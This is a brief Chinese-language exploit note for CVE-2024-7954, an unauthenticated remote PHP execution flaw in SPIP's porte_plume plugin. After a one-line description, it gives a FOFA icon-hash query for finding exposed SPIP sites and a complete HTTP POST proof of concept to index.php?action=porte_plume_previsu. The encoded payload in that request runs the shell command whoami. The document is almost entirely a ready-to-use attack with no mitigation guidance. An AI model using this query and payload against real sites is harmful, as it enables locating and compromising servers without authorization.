# SPIP-porte_plume插件存在任意PHP执行漏洞(CVE-2024-7954)

SPIP使用的porte_plume插件存在任意代码执行漏洞。未经身份验证的远程攻击者可以通过发送精心设计的 HTTP 请求以 SPIP 用户身份执行任意 PHP。

## fofa

```java
icon_hash=="-1224668706"
```

## poc

```java
POST /index.php?action=porte_plume_previsu HTTP/1.1
Host: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

data=AA_%5B%3Cimg111111%3E-%3EURL%60%3C%3Fphp+system%28%22whoami%22%29%3B%3F%3E%60%5D_BB
```

